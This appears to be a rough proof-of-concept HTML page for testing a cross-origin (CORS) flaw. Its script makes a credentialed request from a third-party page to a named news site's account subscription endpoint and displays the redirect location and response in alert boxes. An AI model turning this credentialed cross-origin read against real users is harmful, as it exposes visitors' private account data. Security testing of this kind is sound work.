<!DOCTYPE html>
<html><body>
<script>
var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
      // return if not ready state 4
      if (xhttp.readyState !== 4) {
        return;
      }

      // check for redirect
      if (xhttp.status === 302) {
        var location = this.getResponseHeader("Location");
alert(0);
        alert(location);
      } 
if (xhttp.status == 302) {
        var location = this.getResponseHeader("Location");
alert(2);
        alert(location);
      } 
      // return data
alert(1);
      alert(this.responseText);
  };
  xhttp.open("GET", "https://myaccount.ad.nl/rest/subscriptions.k",true);
  xhttp.withCredentials = true;
  xhttp.send();

</script>
</body>
</html>
